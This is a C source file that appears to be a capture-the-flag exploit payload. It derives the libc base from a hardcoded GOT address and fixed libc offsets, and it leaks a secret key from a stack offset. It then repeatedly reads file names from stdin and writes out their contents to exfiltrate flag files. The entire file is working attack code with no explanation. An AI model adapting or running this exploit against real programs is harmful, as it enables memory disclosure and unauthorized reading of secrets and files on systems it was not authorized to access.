#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h> 
#include <stdint.h> 
#include <stdlib.h> 
#include <unistd.h> 

typedef int (*read_fn)(int, void*, size_t);
typedef int (*open_fn)(const char *, int, mode_t);
typedef int (*close_fn)(int);
typedef int (*system_fn)(const char *);
typedef void *(*malloc_fn)(size_t);
typedef pid_t (*fork_fn)(void);
typedef int (*execl_fn)(const char *, const char *, const char *);
typedef pid_t (*waitpid_fn)(pid_t, int *, int);

const intptr_t read_offset      = 0x0111130;
const intptr_t write_offset     = 0x01111d0;
const intptr_t open_offset      = 0x0110e50;
const intptr_t close_offset     = 0x0111970;
const intptr_t malloc_offset    = 0x009d260;
const intptr_t fork_offset      = 0x00e6070;
const intptr_t execl_offset     = 0x00e6680;
const intptr_t waitpid_offset   = 0x00e5d70;
const intptr_t exit_offset      = 0x0049bc0;

void exploit(void) {
    register long rsp asm("rsp");
    void *keyAddr = (void *)*(intptr_t *)(rsp + 0x30+0x18+0x20+0x78);
    intptr_t read_addr  = *(intptr_t *)(0x404040);
    intptr_t libc_base  = read_addr - read_offset;
    
    read_fn _read       = (read_fn)read_addr;
    read_fn _write      = (read_fn)(libc_base + write_offset);
    open_fn _open       = (open_fn)(libc_base + open_offset);
    close_fn _close     = (close_fn)(libc_base + close_offset);
    malloc_fn _malloc   = (malloc_fn)(libc_base + malloc_offset);
    close_fn _exit      = (close_fn)(libc_base + exit_offset);
    //fork_fn _fork       = (fork_fn)(libc_base + fork_offset);
    //execl_fn _execl     = (execl_fn)(libc_base + execl_offset);
    //waitpid_fn _waitpid = (waitpid_fn)(libc_base + waitpid_offset);

    _write(1, keyAddr, 64);

    // Read flag file name
    while(1) { 
        char *file = _malloc(32);
        int total = 0;
        while(total < 32)
            total += _read(0, file+total, 32-total);
        // open and read and report the flag
        int fd = _open(file, O_RDONLY, 0);
        if (fd < 0){
            while(1) {}
        }
        char *flag = _malloc(512);
        int flag1Len = _read(fd, flag, 512);
        _close(fd);
        if (-1 == _write(1, flag, 512)) {
            break;
        }
    }
    _exit(0);
    while(1);
}
